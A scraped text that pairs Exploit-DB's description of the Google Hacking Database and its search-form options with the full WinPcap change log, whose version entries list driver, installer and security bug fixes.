is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.winpcap.org_16c9a9d3_20250125_205200.html ===


# [WinPcap](/ "WinPcap Home…")

* [Riverbed Technology](http://www.riverbed.com/ "Riverbed Web Site")
* [Wireshark](http://www.wireshark.org/ "Wireshark Web Site")

The industry-standard windows packet capture library

* [WinPcap](/)
  + [Get WinPcap](/install/)
  + [News](/news.htm)
  + [Features](/misc/features.htm)
  + [Documentation](/docs/)
  + [Development](/devel.htm)
  + [Support](/contact.htm)
  + [FAQ](/misc/faq.htm)
  + [Report a Bug](/bugs.htm)
  + [Archive](/archive/)
  + [Links](/misc/links.htm)
  + [Calculators](/misc/calculators.htm)
  + [License](/misc/copyright.htm)
* [Win Dump](/windump/)
  + [Get WinDump](/windump/install/)
  + [News](/windump/news.htm)
  + [Documentation](/windump/docs/)
  + [Support](/windump/misc/help.htm)
  + [FAQ](/windump/misc/faq.htm)
  + [Change Log](/windump/misc/changelog.htm)
  + [Archive](/archive/)
  + [The Team](/windump/misc/credits.htm)
  + [License](/windump/misc/copyright.htm)
* [NTAR](/ntar/)
  + [Get NTAR](/ntar/download/)
  + [Documentation](/ntar/docs/)
  + [Change Log](/ntar/changelog.htm)
  + [License](/ntar/copyright.htm)

WinPcap Change Log
# Version 4.1.3, 08 mar 13

* Added support for Windows 8 and Server 2012
* Removed the old CACE logo
* Bugfixes:
  + Fixed a bug in the Just-In-Time compiler for BPF filters that could cause an OS crash when dealing with specially crafted LD instructions
  + The BPF filter validation code was not properly validating division-by-zero DIV instructions.
* Known bugs:
  + Transmitted packets are looped back on Windows 8 even when using the flag PCAP\_OPENFLAGS\_NOCAPTURE\_LOCAL for pcap\_open.
  + pcap\_dump\_fopen is not supported.

# Version 4.1.2, 02 jul 10

* Bug fixing:
  + Fixed a bug reported by Boaz Brickner (<http://pcapdotnet.codeplex.com/>):
    the driver could cause an OS crash when an IRP\_MJ\_CLEANUP is processed in parallel
    with an IRP\_MJ\_READ/WRITE/DEVICECONTROL. The fix defers the deallocation of the
    open structure in IRP\_MJ\_CLOSE.
  + Fixed a bug in the buffered write code. A malformed transmit buffer sent with pcap\_sendqueue\_transmit
    could cause a buffer overflow and crash the OS.
  + Disabled tracing in the driver (it was left on by mistake in the previous release
    of WinPcap).
  + Added the missing export pcap\_free\_datalinks.
  + Do not show the installation panel with the OS info.
  + Small fix to the documentation regarding WDK.

# Version 4.1.1, 20 oct 09

* This release fixes a bug in the installer of WinPcap
  4.1. The binaries were not digitally signed, thus
  preventing the WinPcap driver from working on
  Vista/2008/Win7/2008R2 x64.

# Version 4.1, 19 oct 09

[From WinPcap 4.1 beta5]

* Several fixes and updates to the installer:
  + Added installation support for Windows 7 and Server
    2008 R2
  + Added a new wizard page to choose if the driver
    should be started automatically on boot.
  + Fixed some issues when upgrading WinPcap on Windows
    Vista and Server 2008 x64.
  + Better handle errors when Microsoft NetMon 2.x is
    not available.
  + Better detection of the target operating system,
    especially when the installer is run in compatibility
    mode.
* wpcap.dl lhas been updated to the 1.0 branch of libpcap from [www.tcpdump.org](http://www.tcpdump.org).
* Updated the tools used for the
  compilation (WDK 6001.18002).

* Bug fixing:
  + Exported `pcap_setdirection()`
  + Fixed a bug in the compilation of `rpcapd`.
    This bug was causing the daemon not to capture any
    packets.

# Version 4.1 beta5, 08 jan 09

* Starting from this build, WinPcap is completely compiled
  with Visual Studio 2005 SP1 (in order to have a single build
  environment for x86 and x64) and WDK6000. While the projects for Visual
  Studio 6 are still available in the source package, they are
  no longer maintained.
* wpcap.dll has been updated to libpcap 1.0.0 from
  <http://www.tcpdump.org>.
* The new VS2005 project files for wpcap.dll and
  packet.dll have been simplified a lot (i.e. less
  configurations!).
* Big parts of the installer have been rewritten and
  cleaned up to account for the x64 binaries installation.
* The old WanPacket DLL has been removed. The code has
  been merged into `packet.dll`.
* The developer's pack includes LIB files for both x86 and
  x64 (for Visual Studio). At the moment we don't have the LIB
  files for Cygwin under x64.
* The samples have been ported to Visual Studio 2005,
  and they compile for both x86 and x64 architectures. The
  old Visual Studio 6 projects are still available but not
  actively maintained.
* Bug fixing:
  + Fixed the remote code to make it compile properly on
    Linux.
  + Fixed a problem with the icon in the windows control
    panel.
  + Fixed an installation bug under x64 for `rpcapd.exe`.
    When installing rpcapd on an x64 machine, the executable
    is located in `c:\program files (x86)`, not in `c:\program
    files`.
  + Support an indefinite number of IP (v4 and v6)
    addresses associated with an adapter.
  + Check that IPv4 is bound to an adapter before
    getting the IPv4 addresses from the registry.
  + Fixed several compilation warnings in the samples.
  + Exported `pcap_hopen_offline`.
  + Added a missing definition of `HAVE_UINT64` in the
    `bittypes.h`.
  + Fixed a bug in the filtering code for TurboCap
    adapters. The snaplen was completely ignored.

# Version 4.1 beta4, 27 may 08

* Added support for the TurboCap boards within
  `wpcap.dll`.
* (from libpcap) Added the new functions `pcap_create()`,
  `pcap_activate()`, `pcap_set_XXX()`
  (still not completely documented on Windows).
* (from libpcap) Added support for various MAC
  addresses' syntaxes. Now the following syntaxes are
  supported:
  + `00:11:22:33:44:55`
  + `00-11-22-33-44-55`
  + `00.11.22.33.44.55`
  + `001122334455`.
* Bug fixing:
  + Use `FILE_DEVICE_SECURE_OPEN` as a parameter to
    `IoCreateDevice()` when creating the I/O device from within
    the driver on the OSes that support it.
  + Fixed a bug in `pcap_open_live()` and `pcap_activate()`. They
    were failing if called on a local adapter with the syntax
    `rpcap://\\Device....`
  + Added a missing input buffer check in the read
    handler of the driver when working in statistics mode.
  + Optimized the code in the driver that handles the
    `BIOCGSTATS` control code (map only the needed portion of
    the user buffer into an MDL).
  + Fixed a possible memory leak in one of the error
    paths of the driver when enumerating the available
    adapters.
  + Cleaned up some global variable names in the driver.

# Version 4.1 beta3, 31 jan 08

* (from libpcap) Make some arguments of some `pcap` functions `const`
  pointers if that makes sense.
* (from libpcap) Add some additional checks to
  `bpf_validate()`, from OpenBSD.
* (from libpcap) Use `bpf_validate()` in
  `install_bpf_program()`, so we validate programs even when
  they're being processed by userland filters.
* (from libpcap) Get rid of `BPF_MAXINSNS` - we don't
  have a limit on program size in libpcap/WinPcap.
* (from libpcap) Support for the "addr1", "addr2",
  "addr3", and "addr4" link-layer address filtering
  keywords for 802.11.
* (from libpcap) Support for filtering over 802.11
  frame types with the keywords "type" and "subtype".
* Bug fixing:
  + Fixed a bug when generating wireless filters in the
    form `"link src host ..."`. The source address was not
    retrieved properly.
  + Added some more logic in the installer to account
    for errors while installing the Network Monitor
    component (NetMon). If NetMon is not available, we
    install a version of `packet.dll` that doesn't depend on
    it.
  + Fixed two bugs in the original OpenBSD filter
    validation code, one that caused it to reject all
    filters that used multiply instructions, and another
    that caused it to reject all filters that used divide
    instructions.
  + Fixed a bug in the filter engine in the driver. When
    the packet to filter is split into two buffers, under
    some circumstances the engine was not checking the right
    bytes in the packet.

# Version 4.1 beta2, 15 nov 07

* Disabled support for monitor mode (also called TME,
  Table Management Extensions) in the driver. This module
  suffers from several security vulnerabilities that could
  result in BSODs or privilege escalation attacks. This
  fix addresses a security vulnerability reported by the
  iDefense Labs
  [here](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=625).
* Added a small script to integrate the libpcap
  sources into the WinPcap tree automatically.
* Moved the definition of all the I/O control codes to
  `ioctls.h`.
* Cleaned up and removed some build scripts for the
  developer's pack.
* Migrated the driver compilation environment to WDK
  6000.
* Enabled PreFAST driver compilation for the x64
  build.
* Added some doxygen directives to group the IOCTL codes and JIT definitions in proper groups.
* Integrated the IOCTL codes into one single set
  shared by `packet.dll` and driver.
* Modified the installer to return the win32 error
  code instead of -1 in case of failure in the error
  messages.
* Added some `#define` directives to selectively disable
  the TME functionality for WAN (i.e. Netmon-assisted)
  devices.
* Added a VS2005 project to easily edit the files of
  the driver.
* Removed some useless `#include` directives in the
  driver and `packet.dll`.
* Migrated several conditional directives (`#ifdef`/`#endif`)
  to the defines of the DDK/WDK e.g. `_X86_` and `_AMD64_`.
* Added a check to warn users that `remote-ext.h` should
  not be included directly.
* Removed `ntddndis.h` from the WinPcap sources. It's
  included into the Microsoft Platform SDK.
* Removed `devioctl.h` from the WinPcap sources. It's
  included into the Microsoft DDK/WDK.
* Removed `ntddpack.h` from the WinPcap sources. It's an
  old header file from the original DDK Packet sample, and
  it's not used by WinPcap.
* Removed several useless files from the WinPcap
  developer's pack:
  + all the TME extension header files
  + `devioctl.h`
  + `gnuc.h`
  + `ntddndis.h`
  + `ntddpack.h`
  + `pcap-int.h`.
* Bug fixing:
  + Fixed a possible buffer overrun on x64 machines
    with more that 32 CPUs/cores.
  + Fixed an implicit cast problem compiling the
    driver on x64.
  + Fixed a bug in the installer causing a mis-detection
    of a previous WinPcap installation.
  + Fixed two bugs related to memory deallocation in
    `packet.dll`. We were using `free()` instead of
    `GlobalFreePtr()`, and there was a missing check as to
    when to deallocate a chunk of memory.
  + Added a missing `NULL` pointer check in `pcap_open()`.
  + Moved a misplaced `#ifdef WIN32` in `pcap_open()`.
  + Fixed a bug in the send routine of the driver
    that could cause a crash under low resources
    conditions.

# Version 4.0.2, 09 nov 07

* Disabled support for monitor mode (also called
  TME, Table Management Extensions) in the driver.
  This module suffers from several security
  vulnerabilities that could result in BSODs or
  privilege escalation attacks. This
  fix addresses a security vulnerability reported by
  the iDefense Labs
  [here](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=625).
* Bug fixing:
  + Added a missing NULL pointer check in `pcap_open()`
  + Fixed a misplaced `#ifdef WIN32` directive in
    `pcap_open()`.
  + Fixed a bug in the send routine of the driver
    that could cause a crash under low resources
    conditions.
  + Fixed a bug in the installer causing a mis-detection
    of a previous WinPcap installation
  + Minor cleanup of some `#define` directives in the
    driver (to disable the TME extensions).

# Version 4.1 beta, 03 jul 07

* Added support for the Per Packet Info (PPI) link
  type.
* wpcap.dll has been updated to the libpcap 0.9.6
  branch from
  <http://www.tcpdump.org>.
* Bug fixing:
  + Fixed a bug in `pcap_open_live()` by which we were
    silently ignoring a failure when switching into
    promiscuous mode. This fix solves the outstanding
    issue of wireless cards that fail to go into
    promiscuous mode and do not capture any packet.
  + Experimental fixes to the BPF compiler (`pcap_compile()`)
    to better support filters over 802.11.
  + Minor fixes to remove several PFD (PreFAST for
    Drivers) warnings.
  + (from libpcap 0.9.6) added additional filter
    operations for 802.11 frame types
  + (from libpcap 0.9.6) fixes to discard unread packets
    when changing filters.

# Version 4.0.1, 03 jul 07

* Bug fixing:
  + Fixed a bug in the dispatcher of the
    `BIOCGSTATS` IOCTL that caused a BSOD if the
    parameters passed from user level were invalid. This
    fix addresses a security vulnerability reported by
    the iDefense Labs in
    [this advisory](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=550).
  + Fixed a bug in the routine installing NetMon. A
    request to reboot was not caught properly, resulting in
    an installation error message.
  + Minor fixes to remove several PFD (PreFAST for
    Drivers) warnings.
  + Added a missing check for the Mdl in the write
    dispatcher routine.

# Version 4.0, 29 jan 07

* Added support for Vista x64 by digitally signing all
  the binaries of the WinPcap distribution.
* Better error handling in the installer - if the
  installation of the Microsoft Network Monitor Driver (NetMon)
  fails.
* Improved the documentation layout and readability -
  updated the style sheet and migrated to Doxygen 1.5.1.

# Version 4.0 beta3, 06 dec 06

* Removed support for Windows 9x/ME. Sources still
  available.
* Enabled the generation of PDB files for the release
  build, too.
* Raised the compilation warning level to /W4 for
  `packet.dll` and `wanpacket.dll`. Fixed a large amount of
  warnings.
* Added some initial support for the NpfIm capture
  engine into `packet.dll`. Such support is still disabled
  at compilation time.
* Rewritten the `packet.dll` debugging code completely to
  make use of the new `TRACE_xxx` macros.
* Moved all the code managing strings to the `strsafe.h`
  ones (`StringCchXXX`).
* Refreshed the Vista build configuration of
  `packet.dll`. Now we fully support AirPcap adapters and
  the IP Helper API on Vista x86.
* Added support for `AirPcapWrite()` into `packet.dll`, i.e.
  support for transmission with AirPcap adapters.
* Minor cleanup in the scripts to build the
  developer's pack.
* Bug fixing:
  + Added a check for bogus return values from
    `NdisRequest()` (Query). The Nortel Contivity VPN Client
    V04\_65.18 has a bug in the driver by which a request
    for `OID_GEN_LINK_SPEED` pretends to have written a
    buffer larger than the one passed as input (BytesWritten
    > InputBufferLength).
  + Fixed a bug where, in certain scenarios, the AirPcap adapter entries in the adapter list were
    duplicated.
  + Fixed some memory leaks in `packet.dll` when
    dealing with AirPcap adapters.
  + Fixed several ancillary `packet.dll` APIs that
    were crashing if used with AirPcap adapters.
  + `PacketSetReadTimeout()` was returning failure in
    case of AirPcap adapters.
  + Fixed a couple of bugs in the UserLevelBridge
    sample.
  + Added a missing return value check in the tcptop
    sample.
  + Fixed a dependency problem in the `wpcap.dll`
    project.
  + Fixed some minor errors and typos in the
    documentation.

# Version 4.0 beta2, 20 oct 06

* `wpcap.dll` has been updated to libpcap 0.9.5 from
  <http://www.tcpdump.org>.
* Bug fixing:
  + Fixed a synchronization problem when accessing
    the BPF filter and the kernel buffer in the `npf.sys`
    kernel driver. Instead of using some custom made
    synchronization code, the standard Windows spinlocks
    are used.

# Version 4.0 beta1, 23 aug 06

* Added support for
  [AirPcap](http://www.riverbed.com/us/products/cascade/wireshark_enhancements/airpcap.php) adapters.
* Rewritten the transmit code in the driver (NPF\_Write()),
  in order to improve its solidity:
  + the IRP is not marked as pending
  + we use a different algorithm to stop
    transmitting when the packets are all pending
  + added a new NdisEvent for the management of the
    transmit operations.
  + added a counter used upon transmission with
    NPF\_Write() to keep track of the number of pending
    packets.
* Added a global version header file that is used for
  all the modules of WinPcap.
* Updated the license in the installer and on the web
  to account for the third party source files used by
  WinPcap and libpcap.
* Updated the documentation that explains how to write an
  application based on wpcap.dll.
* Removed some useless files in the source tree
  (these files that are automatically generated by the build
  process or no longer in use).
* Removed some useless files from the developer's pack.
* Bug fixing:
  + Fixed a bug by which the caplen field of a WAN
    packet was set to a random number (usually 0 for the
    first packets of a capture). This was causing
    WinPcap not to work at all on dialup/VPN adapters.
  + Fixed a bug in the BIOCSETOID/BIOCREQUESTOID
    code: in one error management path we were not
    releasing the NDIS binding context with
    NPF\_StopUsingBinding().
  + Fixed a bug in some samples (when compiled under
    VS2005): localtime() accepts a time\_t variable, which
    happens to be a 32bit value with VS6/VS2003, and a
    64bit value when compiled under VS2005.
  + Fixed a bug in some samples: added a const
    qualifier for the packet data returned by
    pcap\_next\_ex().
  + Fixed a couple of bugs in the remote capture
    code that were causing wpcap.dll to fail when a read
    timeout occurred, and a failure to use the remote
    capture deamon (rpcapd) when compiled on a
    big-endian machine.
  + Added the usual #ifndef/#define and #ifdef \_cplusplus
    stuff to win32\_extensions.h
  + Minor fixes to the samples.
  + Minor fixes to avoid some compilation warnings
    under Cygwin.
  + Minor layout fixes to the documentation.

# Version 4.0 alpha1, 10 may 06

* Various modifications to the Windows NTx driver
  `npf.sys`:
  + General rewriting of all the functions
    dispatching the open/close/cleanup/bind/unbind
    requests from the operating system. This should
    should solve a number of crashes when an adapter is
    disabled, removed or "repaired".
  + Rewrote the IOCTL dispatcher managing the
    `NDIS_REQUEST`s to the driver. This should solve a
    number of crashes dispatching an `NDIS_REQUEST` when
    the adapter has been removed/disabled.
  + Rewrote several parts of the tracing code.
  + Moved from named to unnamed events for the
    shared read events. This fix solves a large number
    of issues with the closing of handles.
  + Merged the x86-64 modifications into the main
    trunk.
  + Cleaned up the compilation scripts.
* Added all the new tracing infrastructure into
  `packet.dll` NTx version.
* Removed the ODS and ODSEx macros from the `packet32.h`
  include files, as they are private debugging macros.
* Updated some parts of the documentation related to
  the compilation of WinPcap and related samples under
  Visual Studio 6.
* Cleaned up the installer:
  + added more error checking and reporting when the
    driver and remote capture capture service are not
    installed correctly.
  + removed the 'dial-home' page at the beginning of
    the installation.
  + Cleaned up some error messages in the message
    boxes.
* Added support for remote capture into `pcap_dispatch()`.
  Thanks to Guy Harris for the patch.
* Added the `PCAP_OPENFLAG_NOCAPTURE_LOCAL` to `pcap_open()`.
  This flag instructs an adapter not to capture the
  packets sent by itself, and is useful to build
  applications like network bridges.
* Added the UserBridge sample application, that
  implements a user-level bridge between two winpcap
  interfaces.
* Bug fixing:
  + [From Guy Harris] `PacketSetReadEventTimeout()` had
    some bugs in the DAG code path (`INFINITE` vs.
    `IMMEDIATE` timeouts were messed up).
  + Added some check to verify the result of
    `MmGetSystemAddressForMdl(Safe)`.
  + Minor fixes to remove some PREfast warnings in
    the compilation of the `npf.sys` driver.
  + Minor patches to properly compile `packet.dll` and
    `wpcap.dll` under Cygnus and MingW32. Thanks to "deadchicken"
    for the patches.
  + Added a patch to set the last error to
    `ERROR_INSUFFICIENT_BUFFER` if the buffer passed to
    `PacketGetAdapterNames()` is too small.
  + Fixed a couple of buffer overruns while creating
    the device name to be opened with `CreateFile()`.
  + Fixed a couple of buffer overruns while copying
    the devices within `AddAdapter()`. Added a check to
    prevent copying truncated names in adapter names in
    `ADAPTER_INFO` (if the adapter name is too long, we
    simply skip it).
  + Fixed a couple of memory leaks found in
    `AddAdapter()` by Real Blanchet.
  + Fixed a bug that prevented WinPcap 3.2a1 to work
    correctly on Windows 9x.

# Version 3.2 alpha1, 18 dec 05

* Added support for x86-64 (AMD64) under Windows XP/2003.

  Under 64bit platforms, the NPF driver is 64bit, and the user
  level DLLs (`packet.dll` and `wpcap.dll`) are 32bit. As a
  consequence, it's possible to run any 32bit WinPcap-based application
  without any recompilation.

  The x86-64 NPF driver has the following limitations:
  + BPF filters are not JITted to x86-64 instructions (filters
    are interpreted).
  + The `MONITOR_MODE` (used mainly by
    [Analyzer](http://analyzer.polito.it/30alpha/)) is not supported.
  + it's not possible to change the timestamping mode using the
    registry key

          `HKLM\System\CurrentControlSet\Services\NPF\TimestampMode`.

    Timestamps are always computed using
    `KeQueryPerformanceCounter()`.

  Moreover, due to the lack of the NetMon COM component on the
  64bit version of Windows, dialup adapters are not supported.
* `wpcap.dll` has been updated to libpcap 0.9.4 from
  <http://www.tcpdump.org>.
* Added a patch file containing the patches for remote capture
  against the vanilla libpcap sources.
* Better error handling in the installer.
* Applied some patches to the bpf\_filter and verifier (from
  Guy Harris):
  + BPF programs with no instructions
  + `BPF_STX` and `BPF_LDX|BPF_MEM` instructions that have
    out-of-range offsets (which could be made to fetch or store into
    arbitrary memory locations);
  + `BPF_DIV` instructions with a constant 0 divisor (that's a
    check also done at run time).
  + In addition, it makes the `k` field in BPF instructions
    unsigned, as it is in other BPF interpreters
* Enabled `PREFast` (static code analysis tool from the
  Microsoft DDK) on the x86 build of the driver.
* Bug fixing:
  + Added a patch in `PacketGetAdapterNames()` to set the last error
    to `ERROR_INSUFFICIENT_BUFFER` if the buffer passed to the
    function is too small. Modified `pcap_findalldevs()` so that it
    correctly handles this situation.
  + Fixed a bug in `PacketGetAdapterNames()`: the requested buffer
    size to correctly return all the adapter names was wrongly
    computed (overestimated of 3-4 bytes)
  + Fixed a problem while listing the adapters under Win9x: if
    the key `HKLM\System\CurrentControlSet\Services\Class\Net\<number>`
    did not contain an `NDIS` key, the code was going into an
    infinite loop.
  + Minor fixes the documentation.
  + Fixed the prototype for the JITted BPF filter function under
    x86; thanks to this patch, we no longer need to manually fix the
    stack pointer after the JITted function returns.

# Version 3.1, 5 aug 05

* New installation script based on the
  [NSIS installer](http://nsis.sourceforge.net/). The
  new installer should be able to detect any previous version of
  WinPcap, remove it on request and install the new version,
  decreasing the number of situations in which a reboot is necessary.
  Moreover, by connecting to the WinPcap website, the installer is
  able to tell the user if more recent versions of WinPcap are
  available.
* wpcap.dll has been updated to libpcap 0.9.3 from
  <http://www.tcpdump.org>.
* General cleanup of the documentation (now aligned to libpcap
  0.9.3).
* Modified the documentation, so that packet.dll is no
  longer available in the standard developer's pack.
* Added to the developer's pack a set of libpcap-compatible samples, suitable to be
  compiled against vanilla libpcap
* Exported the following new functions from wpcap.dll:
  pcap\_list\_datalinks() and pcap\_dump\_ftell().
* Removed pcap\_file() from the exports because of
  incompatibilities with the Microsoft C runtime (CRT).
* General cleanup of the existing samples.
* Renamed the NdisWanAdapter to GenericDialupAdapter, to make
  the use of this adapter more clear for the users.
* Removed some useless files in the source tree and in the
  documentation.
* Bug fixing:
  + Fixed several bugs in the kernel BPF filter function
    when the packet is stored into two not contiguous buffers.
    This bug shows up as missing packets in the capture while
    the machine is using personal firewalls and certain
    antivirus softwares.
  + Fixed a problem related to the NetMon COM component
    initialization. This bug caused random access violation
    errors while listing the adapters.
  + Removed a duplicated initialization of an event in the
    driver.
  + Added a check in packet.dll that prevents listing and
    opening of FireWire adapters, since they have a broken
    interface with NDIS and can cause blue screens.
  + Fixed a memory leak in PacketGetAdaptersIPH().
  + Fixed a check that could cause PacketSendPackets() to
    crash packet.dll.
  + Minor fixes.

# Version 3.1 beta4, 4 nov 04

* wpcap.dll has been updated to libpcap 0.8.3 from
  <http://www.tcpdump.org>.
* Added a note in the documentation that states that the kernel
  dump feature is disabled due to incompatibilities with the new
  kernel buffer.
* Minor fixes to the documentation.
* Removed some useless files.
* Bug fixing:
  + Fixed a bug related to COM initialization in
    WanPacket.dll, by which WanAdapters were not working
    correctly if the calling thread was using COM with a different threading model.
  + Fixed a problem in AddAdapterIPH(), by which no
    adapter was actually added with this function because of a
    UNICODE/ASCII mismatch. Basically, AddAdapterIPH() received
    an ASCII adapter name, and tried to open it with
    PacketOpenAdapterNPF(), which accepts UNICODE strings, only.
  + Fixed a bug in the remote capture code due to
    concurrency issues when spawning a new thread.
  + Fixed a problem related to the generation of grammar
    files with flex in the CygWin makefile.
  + Fixed a couple of memory leaks in PacketGetAdapterNames().
    PacketGetAdapterNames() seems to be still leaky, but the
    source of the leak seems to be a leaky API in the Microsoft
    IpHelperAPI, at least on WinXP SP1.
  + Added some code that frees the global list of adapters
    when packet.dll is unloaded (i.e. when DllMain() is called
    with DLL\_PROCESS\_DETACH).
  + Fixed a bug that caused the adapters not to be listed on
    terminal services. The bug was caused by the lack of the "\\global"
    prefix in front of the adapter names.
  + Fixed a bug related to adapter opening in the
    pcap\_filter example. Fixed the usage string that was wrong.
  + Fixed a bug in the JIT code of the driver that could
    potentially cause a BSOD if two threads try to set a filter
    (that will be jitted) at the same time.
  + Fixed a bug by which the driver fails to return any
    packet with a read after an IOCTL\_SETBUFFER has changed the
    buffer size. The bug is due to some missing counter resets.
  + Fixed some debugging messages in the NT driver that were
    not macroed with IF\_LOUD.

# Version 3.1 beta3, 15 may 04

* Bug fixing:
  + Fixed a bug related to device listing if TCP/IP is not
    installed: on 2000/XP if TCP is not installed, it reported "you
    must install TCP/IP", and this was plain wrong.
  + Added `PacketSetSnapLen()` under Win9x. Without this
    function, wpcap.dll fails to load on Win9x.
  + `PacketGetAdapterNames()` has been rewritten
    under Win9x, in order to comply
    to the correct behavior specified in the documentation.

# Version 3.1 beta2, 3 may 04

* Added some code to show a fake NdisWan adapter, useful to
  capture LCP/NCP packets. This adapter is always listed on
  2000/XP/2003 (if you have enough privileges), even if you don't
  have any PPP/VPN/... connection established.
* Added a check in the installer, so that the installation
  fails if you don't have administrator privileges.
* Added a check so that NdisWan adapters  (PPP, VPN, ...) are
  listed only if you can capture from them.
* Added a new sample program, which gets the MAC address of an
  interface using packet.dll
* Modified the access to the global list of adapters in
  packet.dll under NT4/2000/XP/2003. Now packet.dll should be
  thread-safe.
* Bug fixing:
  + fixed some resource leaks in the remote capture daemon (rpcapd).
  + fixed a couple of resource leaks in packet.dll.
  + fixed some meaningless last error messages set by
    `PacketOpenAdapter()` (e.g. *"The operation completed
    successfully"*).
  + fixed a shortcoming in `pcap_findalldevs()`, by which the
    adapters where not listed if they couldn't fit into a 8kB
    buffer.
  + fixed a memory leak in `pcap_lookupdev()`.
  + fixed some bugs related to adapters listing:
    - some adapters were not listed, especially if some registry
      keys are messed up.
    - in some situations the listing failed with the message
      *"Attempt to release a mutex not owned by caller"*
    - if `PacketGetAdapterNames()` failed, it returned the wrong
      number of needed bytes for the input buffer.
  + fixed a buffer overrun in npf.sys that caused crashes (BSODs)
    when there are too many adapters in the registry.
  + fixed a bug in npf.sys that caused blue screens (BSODs) when
    you try to send "jumbo" packets, i.e. packets bigger than the
    maximum frame size for the selected link type.
  + minor bug fixes.

# Version 3.1 beta, 3 feb 04

* Support for capture on NdisWan, with the following features:
  + Based on the NetMon API, does NOT use NPF.sys
  + Works with PPP (dial-up) and VPN links
